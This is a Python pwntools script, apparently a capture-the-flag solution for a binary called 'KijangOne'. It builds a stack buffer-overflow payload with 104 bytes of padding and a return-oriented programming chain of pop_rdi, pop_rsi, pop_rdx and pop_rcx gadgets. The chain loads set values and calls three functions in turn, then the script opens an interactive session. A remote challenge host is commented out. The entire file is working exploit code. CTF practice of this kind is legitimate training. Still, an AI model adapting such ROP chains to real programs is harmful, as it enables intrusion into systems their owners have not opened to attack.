from pwn import *

binary = './KijangOne'
elf = context.binary = ELF(binary)

p = process(binary)
#p =remote('188.166.223.179',9691)
p.recv()

#Required Gadgets
pop_rdi = p64(0x0000000000401493)
pop_rsi = p64(0x0000000000401491)
pop_rdx = p64(0x0000000000401248)
pop_rcx = p64(0x0000000000401258)

#Payload
payload = b'a'*104
#guard
payload+= pop_rdi
payload+= p64(0xdeaddead)
payload+= pop_rsi
payload+= p64(0xcafecafe)
payload+= p64(0x0)
payload+= p64(0x0000000000401261) #guard rbp

#rusa 1
payload+= pop_rdi #RDI RET
payload+= p64(0xdeadbeef)
payload+= pop_rsi #RSI 15 RET
payload+= p64(0xfefacafe)
payload+= p64(0x0)
payload+= pop_rdx
payload+= p64(0xcafedada)
payload+= p64(0x000000000040129e) #rusa rbp

#pusat

payload+= pop_rdi
payload+= p64(0x1a2b3c4d)
payload+= pop_rsi
payload+= p64(0xdeadca77)
payload+= p64(0x0)
payload+= pop_rdx
payload+= p64(0xca77caf3)
payload+= pop_rcx
payload+= p64(0xdeda8765)
payload+= p64(0x00000000004012f2) #pusat rbp

p.sendline(payload)

p.interactive()
